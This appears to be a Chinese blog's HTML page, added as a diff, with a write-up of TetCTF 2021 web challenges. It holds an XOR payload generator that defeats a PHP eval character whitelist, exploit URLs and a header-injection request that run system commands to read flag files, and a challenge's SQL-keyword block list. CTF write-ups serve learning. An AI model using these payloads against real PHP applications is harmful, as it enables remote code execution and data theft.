@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言考研回归的第一次做题 0x01 Super Calc打开题目链接 http://139.180.155.171/?calc=(1.2-0.2)*5.1 如下所示： 题目没有什么特别的就是通过从url处可以输入不同的算式，它会进行计算然后给我们返回计算后的结果，不难看出这是个命令注入类的ctf题目。但是当我们输入shell命令时，给我们返回了下列信息。 说明对我们的shell命令有拦截，后面尝试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TetCTF部分web题解">
+<meta property="og:url" content="http://yoursite.com/2021/01/28/TetCTF部分web题解/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言考研回归的第一次做题 0x01 Super Calc打开题目链接 http://139.180.155.171/?calc=(1.2-0.2)*5.1 如下所示： 题目没有什么特别的就是通过从url处可以输入不同的算式，它会进行计算然后给我们返回计算后的结果，不难看出这是个命令注入类的ctf题目。但是当我们输入shell命令时，给我们返回了下列信息。 说明对我们的shell命令有拦截，后面尝试">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-1.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-2.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-3.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-4.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-5.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-6.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-7.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-8.PNG">
+<meta property="og:updated_time" content="2021-01-28T15:30:49.411Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TetCTF部分web题解">
+<meta name="twitter:description" content="前言考研回归的第一次做题 0x01 Super Calc打开题目链接 http://139.180.155.171/?calc=(1.2-0.2)*5.1 如下所示： 题目没有什么特别的就是通过从url处可以输入不同的算式，它会进行计算然后给我们返回计算后的结果，不难看出这是个命令注入类的ctf题目。但是当我们输入shell命令时，给我们返回了下列信息。 说明对我们的shell命令有拦截，后面尝试">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/01/28/TetCTF部分web题解/">
+
+
+
+
+
+  <title>TetCTF部分web题解 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/28/TetCTF部分web题解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TetCTF部分web题解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-28T23:29:17+08:00">
+                2021-01-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>考研回归的第一次做题</p>
+<h4 id="0x01-Super-Calc"><a href="#0x01-Super-Calc" class="headerlink" title="0x01 Super Calc"></a>0x01 Super Calc</h4><h6 id="打开题目链接-http-139-180-155-171-calc-1-2-0-2-5-1-如下所示："><a href="#打开题目链接-http-139-180-155-171-calc-1-2-0-2-5-1-如下所示：" class="headerlink" title="打开题目链接 http://139.180.155.171/?calc=(1.2-0.2)*5.1 如下所示："></a>打开题目链接 <a href="http://139.180.155.171/?calc=(1.2-0.2)*5.1" target="_blank" rel="noopener">http://139.180.155.171/?calc=(1.2-0.2)*5.1</a> 如下所示：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-1.PNG" alt></p>
+<h6 id="题目没有什么特别的就是通过从url处可以输入不同的算式，它会进行计算然后给我们返回计算后的结果，不难看出这是个命令注入类的ctf题目。"><a href="#题目没有什么特别的就是通过从url处可以输入不同的算式，它会进行计算然后给我们返回计算后的结果，不难看出这是个命令注入类的ctf题目。" class="headerlink" title="题目没有什么特别的就是通过从url处可以输入不同的算式，它会进行计算然后给我们返回计算后的结果，不难看出这是个命令注入类的ctf题目。"></a>题目没有什么特别的就是通过从url处可以输入不同的算式，它会进行计算然后给我们返回计算后的结果，不难看出这是个命令注入类的ctf题目。</h6><h6 id="但是当我们输入shell命令时，给我们返回了下列信息。"><a href="#但是当我们输入shell命令时，给我们返回了下列信息。" class="headerlink" title="但是当我们输入shell命令时，给我们返回了下列信息。"></a>但是当我们输入shell命令时，给我们返回了下列信息。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-2.PNG" alt></p>
+<h6 id="说明对我们的shell命令有拦截，后面尝试了很多shell命令都没成功。然后就没有带参数访问了一下，发现了源代码。"><a href="#说明对我们的shell命令有拦截，后面尝试了很多shell命令都没成功。然后就没有带参数访问了一下，发现了源代码。" class="headerlink" title="说明对我们的shell命令有拦截，后面尝试了很多shell命令都没成功。然后就没有带参数访问了一下，发现了源代码。"></a>说明对我们的shell命令有拦截，后面尝试了很多shell命令都没成功。然后就没有带参数访问了一下，发现了源代码。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-3.PNG" alt></p>
+<h6 id="分析了一下源代码，发现了一处关键点："><a href="#分析了一下源代码，发现了一处关键点：" class="headerlink" title="分析了一下源代码，发现了一处关键点："></a>分析了一下源代码，发现了一处关键点：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">......</span><br><span class="line">$wl = preg_match(<span class="string">'/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&amp;]+$/i'</span>, $_GET[<span class="string">"calc"</span>]);</span><br><span class="line">    <span class="keyword">if</span>($wl === <span class="number">0</span> || strlen($_GET[<span class="string">"calc"</span>]) &gt; <span class="number">70</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Tired of calculating? Lets &lt;a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank &gt;relax&lt;/a&gt; &lt;3"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Result: '</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"echo "</span>.<span class="keyword">eval</span>(<span class="string">"return "</span>.$_GET[<span class="string">"calc"</span>].<span class="string">";"</span>).<span class="string">";"</span>);</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们想要执行shell命令，我们必须绕过if语句中的判断，正则表达式给出我们可以使用的字符0123456789-amp-，并且长度不能超过70，我们可以用这些可用字符通过xor构造一个类似-http-139-180-155-171-calc-eval-GET-1-amp-1-system-ls-这样一个payload就可以执行shell命令了。"><a href="#我们想要执行shell命令，我们必须绕过if语句中的判断，正则表达式给出我们可以使用的字符0123456789-amp-，并且长度不能超过70，我们可以用这些可用字符通过xor构造一个类似-http-139-180-155-171-calc-eval-GET-1-amp-1-system-ls-这样一个payload就可以执行shell命令了。" class="headerlink" title="我们想要执行shell命令，我们必须绕过if语句中的判断，正则表达式给出我们可以使用的字符0123456789+-*/().~^|&amp;，并且长度不能超过70，我们可以用这些可用字符通过xor构造一个类似 http://139.180.155.171/?calc=eval($_GET[1])&amp;1=system(ls) 这样一个payload就可以执行shell命令了。"></a>我们想要执行shell命令，我们必须绕过<code>if</code>语句中的判断，正则表达式给出我们可以使用的字符<code>0123456789+-*/().~^|&amp;</code>，并且长度不能超过<code>70</code>，我们可以用这些可用字符通过<code>xor</code>构造一个类似 <code>http://139.180.155.171/?calc=eval($_GET[1])&amp;1=system(ls)</code> 这样一个payload就可以执行shell命令了。</h6><h6 id="payload如下："><a href="#payload如下：" class="headerlink" title="payload如下："></a>payload如下：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebShell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, chars, payload)</span>:</span></span><br><span class="line">        self.chars = chars</span><br><span class="line">        self.payload = payload</span><br><span class="line">        self.dic = self.shell()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(self)</span>:</span></span><br><span class="line">        dic = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(self.chars)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(self.chars)):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, len(self.chars)):</span><br><span class="line">                    temp = self.chars[i] + self.chars[j] + self.chars[k]</span><br><span class="line">                    result = chr(ord(self.chars[i]) ^ ord(self.chars[j]) ^ ord(self.chars[k]))</span><br><span class="line">                    dic[temp] = result</span><br><span class="line">        <span class="keyword">return</span> dic</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(self)</span>:</span></span><br><span class="line">        str1 = <span class="string">''</span></span><br><span class="line">        str2 = <span class="string">''</span></span><br><span class="line">        str3 = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(self.payload)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.dic:</span><br><span class="line">                <span class="keyword">if</span> self.dic[j] == self.payload[i]:</span><br><span class="line">                    str1 = str1 + j[<span class="number">0</span>]</span><br><span class="line">                    str2 = str2 + j[<span class="number">1</span>]</span><br><span class="line">                    str3 = str3 + j[<span class="number">2</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        result = <span class="string">'\''</span> + str1 + <span class="string">'\''</span> + <span class="string">'^'</span> + <span class="string">'\''</span> + str2 + <span class="string">'\''</span> + <span class="string">'^'</span> + <span class="string">'\''</span> + str3 + <span class="string">'\''</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url_encode_shell</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> urllib.parse.quote(self.get_shell())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url_decode_shell</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> urllib.parse.unquote(self.url_encode_shell())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    chars = <span class="string">r"0123456789+-*/().~^|&amp;"</span></span><br><span class="line">    payload = <span class="string">r"eval($_GET[1])"</span></span><br><span class="line">    webShell = WebShell(chars, payload)</span><br><span class="line">    result = webShell.get_shell()</span><br><span class="line">    print(result)</span><br><span class="line">    print(webShell.url_encode_shell())</span><br><span class="line">    print(webShell.url_decode_shell())</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">'00040000020000'^'+8-~021)+85030'^'~~|&amp;(&amp;^^^^^1^)'</span></span><br><span class="line"><span class="string">%2700040000020000%27%5E%27%2B8-~021%29%2B85030%27%5E%27~~%7C%26%28%26%5E%5E%5E%5E%5E1%5E%29%27</span></span><br><span class="line"><span class="string">'00040000020000'^'+8-~021)+85030'^'~~|&amp;(&amp;^^^^^1^)'</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="使用payload列出当前目录："><a href="#使用payload列出当前目录：" class="headerlink" title="使用payload列出当前目录："></a>使用payload列出当前目录：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.180.155.171/?calc=%2700040000020000%27%5E%27%2B8-~021%29%2B85030%27%5E%27~~%7C%26%28%26%5E%5E%5E%5E%5E1%5E%29%27&amp;1=echo%20system(ls);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-4.PNG" alt></p>
+<h6 id="读取flag文件："><a href="#读取flag文件：" class="headerlink" title="读取flag文件："></a>读取flag文件：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.180.155.171/?calc=%2700040000020000%27%5E%27%2B8-~021%29%2B85030%27%5E%27~~%7C%26%28%26%5E%5E%5E%5E%5E1%5E%29%27&amp;1=echo%20system(%27cat%20fl4g1sH3re.php%27);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-5.PNG" alt></p>
+<h4 id="0x02-HPNY"><a href="#0x02-HPNY" class="headerlink" title="0x02 HPNY"></a>0x02 HPNY</h4><h6 id="打开题目链接-http-139-180-155-171-8003-如下："><a href="#打开题目链接-http-139-180-155-171-8003-如下：" class="headerlink" title="打开题目链接 http://139.180.155.171:8003/ 如下："></a>打开题目链接 <a href="http://139.180.155.171:8003/" target="_blank" rel="noopener">http://139.180.155.171:8003/</a> 如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-6.PNG" alt></p>
+<h6 id="跟上一题相反，这个可以使用a-z-等字符，因此我们不用构造无字符的shell直接执行shell命令即可。"><a href="#跟上一题相反，这个可以使用a-z-等字符，因此我们不用构造无字符的shell直接执行shell命令即可。" class="headerlink" title="跟上一题相反，这个可以使用a-z\(\)\_\.等字符，因此我们不用构造无字符的shell直接执行shell命令即可。"></a>跟上一题相反，这个可以使用<code>a-z\(\)\_\.</code>等字符，因此我们不用构造无字符的shell直接执行shell命令即可。</h6><h6 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">139.180.155.171:8003/?roll=readfile(next(array_reverse(scandir(__dir__))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-7.PNG" alt></p>
+<h6 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?roll=(eval(implode(getallheaders()))) HTTP/1.1</span><br><span class="line">xyz: /*test</span><br><span class="line">Host: 139.180.155.171:8003</span><br><span class="line">User-Agent: */ eval(system(&apos;cat fl4g_here_but_can_you_get_it_hohoho.php&apos;));/*</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">abc: test*/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-4-TetCTF-8.PNG" alt></p>
+<h6 id="首先用getallheaders-读取http标头，读取后是一个数组，然后用implode-将数组处理成字符串在拼接道eval-中执行shell命令。"><a href="#首先用getallheaders-读取http标头，读取后是一个数组，然后用implode-将数组处理成字符串在拼接道eval-中执行shell命令。" class="headerlink" title="首先用getallheaders()读取http标头，读取后是一个数组，然后用implode()将数组处理成字符串在拼接道eval()中执行shell命令。"></a>首先用<code>getallheaders()</code>读取http标头，读取后是一个数组，然后用<code>implode()</code>将数组处理成字符串在拼接道<code>eval()</code>中执行shell命令。</h6><h6 id="方法二有四个值得注意的地方，一是xyz-test，二是我们在User-Agent-eval-system-39-cat-fl4g-here-but-can-you-get-it-hohoho-php-39-，三是abc-test-，四是Accept中webp-的后面-为什么我们要这么做呢？"><a href="#方法二有四个值得注意的地方，一是xyz-test，二是我们在User-Agent-eval-system-39-cat-fl4g-here-but-can-you-get-it-hohoho-php-39-，三是abc-test-，四是Accept中webp-的后面-为什么我们要这么做呢？" class="headerlink" title="方法二有四个值得注意的地方，一是xyz: /*test，二是我们在User-Agent: */ eval(system(&#39;cat fl4g_here_but_can_you_get_it_hohoho.php&#39;));/*，三是abc: test*/，四是Accept中webp,的后面/为什么我们要这么做呢？"></a>方法二有四个值得注意的地方，一是<code>xyz: /*test</code>，二是我们在<code>User-Agent: */ eval(system(&#39;cat fl4g_here_but_can_you_get_it_hohoho.php&#39;));/*</code>，三是<code>abc: test*/</code>，四是<code>Accept</code>中<code>webp,</code>的后面<code>/</code>为什么我们要这么做呢？</h6><h6 id="xyz-test-User-Agent中的第一个-最后一个-和abc-test-是为了注释eval-中的非代码部分，这样程序才能正常执行，第四个注意点是原来的标头是image-webp-q-0-8这样会破坏-的注释，因此我们将其删除和者添加成image-webp-q-0-8即可。"><a href="#xyz-test-User-Agent中的第一个-最后一个-和abc-test-是为了注释eval-中的非代码部分，这样程序才能正常执行，第四个注意点是原来的标头是image-webp-q-0-8这样会破坏-的注释，因此我们将其删除和者添加成image-webp-q-0-8即可。" class="headerlink" title="xyz: /*test,User-Agent中的第一个*/,最后一个/*和abc: test*/是为了注释eval()中的非代码部分，这样程序才能正常执行，第四个注意点是原来的标头是image/webp,*/*;q=0.8这样会破坏/**/的注释，因此我们将其删除和者添加成image/webp,*//*;q=0.8即可。"></a><code>xyz: /*test</code>,<code>User-Agent</code>中的第一个<code>*/</code>,最后一个<code>/*</code>和<code>abc: test*/</code>是为了注释<code>eval()</code>中的非代码部分，这样程序才能正常执行，第四个注意点是原来的标头是<code>image/webp,*/*;q=0.8</code>这样会破坏<code>/**/</code>的注释，因此我们将其删除和者添加成<code>image/webp,*//*;q=0.8</code>即可。</h6><h4 id="0x03-mysqlimit"><a href="#0x03-mysqlimit" class="headerlink" title="0x03 mysqlimit"></a>0x03 mysqlimit</h4><h6 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'dbconnect.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// filter all what i found on internet.... dunno why ｡ﾟ･（&gt;﹏&lt;）･ﾟ｡</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\&lt;|\&gt;|\=/is'</span> , $_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;img src="https://i.imgur.com/C42ET4u.gif" /&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// prevent sql injection</span></span><br><span class="line">        $id = mysqli_real_escape_string($conn, $_GET[<span class="string">"id"</span>]);</span><br><span class="line"></span><br><span class="line">        $query = <span class="string">"select * from flag_here_hihi where id="</span>.$id;</span><br><span class="line">        $run_query = mysqli_query($conn,$query);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$run_query) &#123;</span><br><span class="line">            <span class="keyword">echo</span> mysqli_error($conn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// I'm kidding, just the name of flag, not flag :(</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">            $res = $run_query-&gt;fetch_array()[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">echo</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
